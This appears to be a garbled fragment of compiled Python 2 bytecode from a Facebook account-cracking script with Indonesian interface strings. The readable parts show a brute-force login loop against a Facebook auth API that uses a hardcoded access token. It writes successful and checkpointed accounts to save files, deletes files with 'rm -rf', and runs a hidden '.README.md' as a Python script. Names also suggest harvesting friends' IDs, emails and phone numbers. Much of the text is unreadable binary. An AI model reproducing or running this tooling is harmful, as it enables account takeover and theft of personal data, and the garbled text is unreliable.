14, 19R5   s   rm -rf login.txts   [✓] Total Nomor: g�������?s;   [1;91m[✓][1;94m Mohon Tunggu Proses Sedang Berjalan ...s5   [!] Untuk Menghentikan Proses Tekan CTRL Lalu Tekan zg      �?i*   s   [1;91m=c            sw  |  } y t  j d � Wn t k
 r* n Xy>| } t j d � �  | d | d � } t j | � } d | k r� d � �  | d | d d GHt d	 d
 � } | j � �  | d | d � | j �  t	 j
 �  | | � n d | d
 k rhd � �  | d | d GHt d d
 � } | j � �  | d | d � | j �  t j
 �  | | � n  Wn n Xd  S(   Nt   saves�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmRQ   s   [1;92m[Successful][1;95m s    >>> s   
s   save/successfull.txtR    s   >>>s   www.facebook.comR�   s   [1;93m[Check][1;96m s   save/check.txt(   R   R�   R�   RV   RS   Rf   R�   R   Ri   R�   R�   t   cpb(   R�   R�   R�   Rp   R�   t   okbt   cps(   t   ct   k(    s   816.pyR�   s  s.    
'!!
!
i   s&   [✓][1;93m Process Telah Selesai ...s"   [✓][1;92m Total OK/[1;96mCP : t   /s9   [✓][1;91m CP File Telah Disimpan : save/checkpoint.txts   
[Press Enter To Go Back]s   python2 .README.md(   R6   R�   R   R*   R-   RS   t	   readlinesRm   R�   t   stripRU   R7   R	   R   R   R   R   R   R�   R�   R�   (   t   bcht   idlistt   linet   xxxR�   R�   (    (   R�   R�   s   816.pyR�   `  s    














































































































	


		)
t   __main__(e   R   R   R   t   datetimeR   R`   t   ret	   threadingRf   R�   t	   cookielibt   getpassR*   t   ranget   nR   t   nmbrRS   R   R   Rd   t   ImportErrorRW   R   t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRV   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR	   R   R   R"   R�   t   Rt   Gt   Wt   St   Pt   YR-   t   CorrectUsernamet   CorrectPasswordt   loopR6   t   usernameRC   R(   t   backt   berhasilR�   R�   Rm   t   listgrupt   gagalt	   idfriendst
   idfromfriendst   idmemt   emt
   emfromfriendst   hpt
   hpfromfriendst   reaksit
   reaksigrupt   koment	   komengrupt   vulnott   vulnt   threadst	   sucessfulRR   t
   action_failedt	   member_idR?   t   numbert   email_from_friendst   reactiont
   reactiongroupt   commentt
   group_commentt	   listgroupR,   R+   R.   R8   R9   R7   R;   R{   R|   R�   t   __name__(    (    (    s   816.pyt   <module>   s�   �




�


			
	#							;		&			�		� � ;
